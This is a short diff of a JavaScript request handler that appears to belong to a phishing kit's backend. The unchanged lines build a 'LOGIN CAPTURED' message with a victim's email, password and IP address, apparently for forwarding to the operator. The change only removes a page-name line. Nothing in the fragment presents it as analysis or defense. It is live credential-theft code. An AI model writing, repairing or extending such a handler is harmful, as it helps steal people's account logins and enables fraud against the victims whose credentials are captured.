@@ -42,7 +42,6 @@ module.exports = async function handler(req, res) {
         const message =
             `🔐 <b>LOGIN CAPTURED</b>\n` +
             `━━━━━━━━━━━━━━━\n` +
-            `📄 <b>Pagină:</b> ${pageName}\n` +
             `📧 <b>Email:</b> <code>${escapeHtml(email)}</code>\n` +
             `🔑 <b>Passwort:</b> <code>${escapeHtml(pass)}</code>\n` +
             `🌐 <b>IP:</b> ${ip}\n` +
